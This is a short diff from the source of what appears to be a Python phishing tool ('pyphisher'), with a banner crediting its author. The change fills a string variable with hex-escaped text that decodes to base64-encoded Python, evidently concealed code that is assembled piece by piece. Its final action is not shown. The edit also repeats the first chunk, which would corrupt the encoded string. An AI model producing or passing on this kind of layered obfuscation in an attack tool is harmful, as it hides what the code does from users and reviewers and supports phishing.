@@ -122,7 +122,7 @@ logo=f'''
 {cyan}        |___/                     {red}[Crado Por Truchorko_#7777]
 '''
 
-pyphisherpyphisherpyphisherpyphisherpyphisher = ""
+pyphisherpyphisherpyphisherpyphisherpyphisher = "\x61\x57\x59\x67\x62\x6d\x39\x30\x49\x47"
 pyphisherpyphisherpyphisherpyphisherpyphisher += "\x61\x57\x59\x67\x62\x6d\x39\x30\x49\x47"
 pyphisherpyphisherpyphisherpyphisherpyphisher += "\x78\x76\x5a\x32\x38\x75\x5a\x6d\x6c\x75"
 pyphisherpyphisherpyphisherpyphisherpyphisher += "\x5a\x43\x67\x69\x53\x32\x46\x7a\x55\x6d"
